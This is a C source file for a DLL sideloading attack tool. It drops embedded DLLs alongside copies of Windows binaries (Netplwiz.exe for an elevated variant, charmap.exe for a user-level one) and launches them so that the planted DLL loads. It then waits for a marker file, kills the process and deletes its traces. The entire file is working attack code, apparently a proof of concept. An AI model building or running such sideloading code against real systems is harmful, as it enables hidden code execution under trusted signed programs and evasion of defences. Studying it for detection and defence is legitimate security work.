
// Standard User DLL Sideloading Files
#include "getuname_dll.h"
#include "_getuname_dll.h"
#include "charmap.h"

// Admin DLL Sideloading FIles
#include "dsrole_dll.h"
#include "_dsrole_dll.h"
#include "netplwiz.h"

// Windows required header files
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <handleapi.h>
#include <synchapi.h>
#include <errhandlingapi.h>
#include <windows.h> // windows.h needs to be included with shellapi.h
#include <shellapi.h>

// File-IO required headers
#include <stdio.h>
#include <unistd.h>

void initializeFiles();
void initializeAdminFiles();
void removeFiles();
void removeAdminFiles();
void runExecutable();
void runAdminExecutable();

int main(int argc, char* argv[]) {
    // Parse command-line args
    // -h = Help
    // -u = User-level/non-priveleged version (charmap.exe)
    // -a = Admin-level/priveleged version (Netplwiz.exe) [Default]
    if (argc == 1) { // no arg specified
        initializeAdminFiles();
        runAdminExecutable();
        Sleep(3000); // 3s (ensure process is no longer accessing files)
        removeAdminFiles();
    } 
    else {
        char* arg = argv[1];

        if (strcmp(arg, "-h") == 0) {
            printf("-h | Display help\n-u | User-level/non-privileged sideload (charmap.exe)\n-a | Admin-level/privileged sideload (Netplwiz.exe) [Default]\n");
            return 0;
        } 
        else if (strcmp(arg, "-a") == 0)  {
            initializeAdminFiles();
            runAdminExecutable();
            Sleep(3000); // 3s (ensure process is no longer accessing files)
            removeAdminFiles();
        }
        else if (strcmp(arg, "-u") == 0) {
            initializeFiles();
            runExecutable();
            Sleep(3000); // 3s (ensure process is no longer accessing files)
            removeFiles();
        }
        else {
            printf("dll_sideloading: unrecognized argument\nUsage: ./dll_sideloading.exe [-h/-a/-u]\n");
            return 1;
        }
    }

    return 0;
}

void runExecutable() {
    SHELLEXECUTEINFOA charmap_sei;
    charmap_sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    charmap_sei.fMask = 0x00000040; // ensures hProcess handle gets set
    charmap_sei.lpVerb = "open";
    charmap_sei.lpFile = "charmap.exe";
    charmap_sei.nShow = 1;


    if (!ShellExecuteExA(&charmap_sei)) {
        printf("FAILED TO SHELLEXECUTE (charmap.exe) - Error %d\n", GetLastError());
        return;
    }

    // Wait for sideload to execute
    do {
        Sleep(1000); // poll every 1s
    } while(access("sideloaded.txt", F_OK) != 0);

    // Keep txt on disk to let users know sideloading worked
    // remove("sideloaded.txt");


    TerminateProcess(charmap_sei.hProcess, 0);
    CloseHandle(charmap_sei.hProcess);
}

void runAdminExecutable() {
    SHELLEXECUTEINFOA netplwiz_sei;
    netplwiz_sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    netplwiz_sei.fMask = 0x00000040; // ensures hProcess handle gets set
    netplwiz_sei.lpVerb = "open"; // automatically prompts for UAC
    netplwiz_sei.lpFile = "Netplwiz.exe";
    netplwiz_sei.nShow = 1;


    if (!ShellExecuteExA(&netplwiz_sei)) {
        printf("FAILED TO SHELLEXECUTE (Netplwiz.exe) - Error %d\n", GetLastError());
        return;
    }
    
    // Wait for sideload to execute
    do {
        Sleep(1000); // poll every 1s
    } while(access("sideloaded.txt", F_OK) != 0);

    // Keep txt on disk to let users know sideloading worked
    // remove("sideloaded.txt");
    
    TerminateProcess(netplwiz_sei.hProcess, 0);
    CloseHandle(netplwiz_sei.hProcess);
}

void removeAdminFiles() {
    remove("dsrole.dll");
    remove("_dsrole.dll");
    remove("Netplwiz.exe");
}

void removeFiles() {
    remove("getuname.dll");
    remove("_getuname.dll");
    remove("charmap.exe");
}

void initializeAdminFiles() {
    FILE* dsrole_dll_file = fopen("dsrole.dll", "w+b");
    fwrite((void*)dsrole_dll, sizeof(char), dsrole_dll_len, dsrole_dll_file);
    fclose(dsrole_dll_file);
    
    FILE* _dsrole_dll_file = fopen("_dsrole.dll", "w+b");
    fwrite((void*)_dsrole_dll, sizeof(char), _dsrole_dll_len, _dsrole_dll_file);
    fclose(_dsrole_dll_file);

    FILE* netplwiz_exe_file = fopen("Netplwiz.exe", "w+b");
    fwrite((void*)Netplwiz_exe, sizeof(char), Netplwiz_exe_len, netplwiz_exe_file);
    fclose(netplwiz_exe_file);
}

void initializeFiles() {    
    FILE* getuname_dll_file = fopen("getuname.dll", "w+b");
    fwrite((void*)getuname_dll, sizeof(char), getuname_dll_len, getuname_dll_file);
    fclose(getuname_dll_file);

    FILE* _getuname_dll_file = fopen("_getuname.dll", "w+b");
    fwrite((void*)_getuname_dll, sizeof(char), _getuname_dll_len, _getuname_dll_file);
    fclose(_getuname_dll_file); 

    FILE* charmap_exe_file = fopen("charmap.exe", "w+b");
    fwrite((void*)charmap_exe, sizeof(char), charmap_exe_len, charmap_exe_file);
    fclose(charmap_exe_file);
}